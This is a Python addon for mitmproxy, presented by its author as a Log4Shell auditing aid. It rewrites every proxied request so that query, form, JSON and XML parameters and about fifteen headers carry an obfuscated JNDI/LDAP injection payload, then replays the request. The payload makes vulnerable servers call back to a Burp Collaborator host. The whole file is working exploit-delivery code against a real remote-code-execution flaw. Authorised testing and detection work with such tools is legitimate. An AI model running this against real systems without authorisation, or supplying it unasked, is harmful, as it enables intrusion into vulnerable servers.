# I've created this mitmproxy addon which can help you to audit your applications against Log4Shell.
# You can run mitmproxy or mitmdump with this script and point your browser to it. Before run update the script with yours Burp Collaborator instance.
# For each request from your browser, mitmproxy will take a copy of it (font, images and css files will be ignored), replace every parameter (GET and POST) value with a Log4Shell payload, add some headers with the same payload and send it to the server.
# If any payload get triggered you will receive a notification in your Burp Collaborator.

import string
import random
import json
import xml.etree.ElementTree as ET
from re import match
from mitmproxy import ctx
from mitmproxy import http
from urllib.parse import unquote

global wlparms
wlparms = ['csrf', 'viewstate', 'authenticity_token', 'captcha', 'accesstoken', 'refreshtoken', 'verificationtoken']

def get_id():
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))

def notwl(i):
    for wlparm in wlparms:
        if wlparm in i.lower():
            return False
    return True

def notwlb(i):
    for wlparm in wlparms:
        if wlparm.encode('utf-8') in i.lower():
            return False
    return True

def request(flow: http.HTTPFlow) -> None:
    if flow.is_replay == "request" or match("^.*\.(js|jpg|jpeg|png|gif|svg|ico|css|txt|woff|woff2|ttf|mp4)$", flow.request.path):
        return
    flow = flow.copy()
    host = flow.request.host.replace('.', '-')
    #pl = '${${-::-jn}di:ldap://127.0.0.1#'+ host + '_' + get_id() + '.${hostName}.bn2cta19z0huw5yequtdeky6wx2oqd.burpcollaborator.net/a}'
    pl = '${${-::-jn}di:ldap://'+ host + '_' + get_id() + '.${hostName}.bn2cta19z0huw5yequtdeky6wx2oqd.burpcollaborator.net/a}'

    if flow.request.query:
        for i in flow.request.query:
            if notwl(i):
                flow.request.query[i] = pl
        #flow.request.path = unquote(flow.request.path)

    if flow.request.urlencoded_form:
        for i in flow.request.urlencoded_form:
            if notwl(i):
                flow.request.urlencoded_form[i] = pl
        #flow.request.content = unquote(flow.request.raw_content).encode('utf-8')

    if flow.request.multipart_form:
        for i in flow.request.multipart_form:
            if notwlb(i):
                flow.request.multipart_form[i] = pl.encode('utf-8')

    if 'content-type' in flow.request.headers:
        if flow.request.content:
            if 'json' in flow.request.headers['content-type']:
                json_body = json.loads(flow.request.content)
                if flow.request.content[0:1] == b'[':
                    for i in json_body[0]:
                        if notwl(i):
                            json_body[0][i] = pl
                else:
                    for i in json_body:
                        if notwl(i):
                            json_body[i] = pl
                flow.request.content = json.dumps(json_body).encode('utf-8')
            elif 'xml' in flow.request.headers['content-type']:
                xml_body = ET.fromstring(flow.request.content)
                for i in xml_body.iter():
                    if not i.text.isspace():
                        if notwl(i):
                            i.text = pl
                flow.request.content = ET.tostring(xml_body)

    #flow.request.headers['User-Agent'] = pl
    flow.request.headers['Referer'] = pl
    flow.request.headers['X-Api-Version'] = pl
    flow.request.headers['Authentication'] = pl
    #flow.request.headers['Authorization'] = pl
    flow.request.headers['Contact'] = pl
    flow.request.headers['CF-Connecting_IP'] = pl
    flow.request.headers['Forwarded'] = pl
    flow.request.headers['Client-IP'] = pl
    flow.request.headers['X-Forwarded-For'] = pl
    flow.request.headers['True-Client-IP'] = pl
    flow.request.headers['From'] = pl
    flow.request.headers['X-Wap-Profile'] = pl
    flow.request.headers['X-Real-IP'] = pl
    flow.request.headers['X-Client-IP'] = pl
    flow.request.headers['X-Originating-IP'] = pl
    
    if "view" in ctx.master.addons:
        ctx.master.commands.call("view.flows.add", [flow])
    ctx.master.commands.call("replay.client", [flow])